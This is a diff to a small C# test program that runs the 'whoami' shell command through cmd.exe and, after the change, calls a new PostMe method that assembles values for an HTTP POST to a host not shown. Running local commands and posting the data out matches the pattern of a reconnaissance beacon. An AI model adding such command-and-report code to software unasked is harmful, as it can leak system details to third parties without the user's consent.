@@ -8,8 +8,8 @@ namespace Testing
 {
     public class Program
     {
-        private static readonly HttpClient client = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate });
-        static void Main(string[] args)
+        static readonly HttpClient client = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate });
+        static void Main()
         {
             string command = "whoami";
 			System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
@@ -33,9 +33,9 @@ namespace Testing
                 string result = response.Content.ReadAsStringAsync().Result;
                 Console.WriteLine("Result: " + result);
             }
-            Console.ReadLine();
+            PostMe();
         }
-        public async void Post()
+        static async void PostMe()
         {
             var values = new Dictionary<string, string>
             {  
